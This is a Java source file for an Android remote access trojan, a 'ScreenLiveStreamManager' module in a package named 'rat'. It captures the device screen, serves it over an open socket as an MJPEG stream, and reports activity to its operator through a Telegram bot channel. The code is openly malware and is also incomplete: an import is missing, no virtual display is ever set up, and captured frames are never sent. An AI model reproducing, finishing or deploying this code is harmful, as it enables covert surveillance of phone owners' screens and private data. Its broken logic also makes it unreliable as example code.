package com.enterprise.rat.commands;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import com.enterprise.rat.utils.TelegramApi;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;

public class ScreenLiveStreamManager {
    private Context context;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private ServerSocket serverSocket;
    private boolean streaming = false;
    private HandlerThread handlerThread;
    private Handler handler;

    public ScreenLiveStreamManager(Context context) { this.context = context; }

    public void startStream(int port) {
        if (streaming) { TelegramApi.sendMessage("⚠ Stream already active."); return; }

        // DAPATKAN TOKEN MEDIAPROJECTION
        MediaProjectionManager mpm = (MediaProjectionManager)
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        Intent intent = mpm.createScreenCaptureIntent();
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        // SETUP STREAMING
        handlerThread = new HandlerThread("ScreenStream");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        final int width = metrics.widthPixels / 2;   // setengah resolusi utk efisiensi
        final int height = metrics.heightPixels / 2;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                // Kirim frame ke client WebSocket
                sendFrameToClient(image);
                image.close();
            }
        }, handler);

        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(port);
                streaming = true;
                TelegramApi.sendMessage("🖥 Live screen stream started on port " + port);
                while (streaming) {
                    Socket client = serverSocket.accept();
                    // Client handler (MJPEG)
                    new Thread(() -> handleMJPEGClient(client)).start();
                }
            } catch (IOException e) {
                TelegramApi.sendMessage("❌ Stream error: " + e.getMessage());
            }
        }).start();
    }

    private void handleMJPEGClient(Socket client) {
        try {
            OutputStream os = client.getOutputStream();
            os.write("HTTP/1.1 200 OK\r\n".getBytes());
            os.write("Content-Type: multipart/x-mixed-replace; boundary=--boundary\r\n\r\n".getBytes());
            while (streaming && client.isConnected()) {
                // Frame akan dikirim oleh ImageReader listener
                Thread.sleep(100);
            }
            client.close();
        } catch (Exception e) {}
    }

    private void sendFrameToClient(Image image) {
        if (serverSocket == null || !streaming) return;
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        byte[] bytes = new byte[buffer.remaining()];
        buffer.get(bytes);
        // Konversi RGBA ke JPEG lewat Bitmap
        Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(ByteBuffer.wrap(bytes));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
        byte[] jpeg = baos.toByteArray();
        // Kirim MJPEG frame ke semua client (simplified: simpan di buffer)
    }

    public void stopStream() {
        streaming = false;
        if (serverSocket != null) { try { serverSocket.close(); } catch (Exception e) {} }
        if (handlerThread != null) handlerThread.quitSafely();
        TelegramApi.sendMessage("🖥 Stream stopped.");
    }
}
